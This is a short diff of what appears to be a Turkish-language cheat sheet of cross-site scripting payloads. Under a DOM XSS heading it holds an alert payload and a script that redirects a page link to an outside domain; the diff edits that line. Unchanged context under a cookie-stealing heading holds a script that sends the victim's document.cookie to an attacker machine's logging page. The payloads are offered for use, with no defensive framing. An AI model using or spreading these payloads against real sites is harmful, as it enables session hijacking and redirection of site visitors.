@@ -18,8 +18,7 @@ URL PATH :
 
 DOM XSS:
 ?data=şlsög#<script>alert(1);</script>
-<script>window.onload = function () {var link=document.getElementById.("link"); link.href="https://sahtesi.com";}</script>
-
+<script> window.onload = function () {var link = document.getElementById("link"); link.href = "http://gsa.com";}</script>
 
 COOKİE STEAL:
 <script>document.location.href="http://atackermachine/logkaydet.php?cookie="+document.cookie</script>
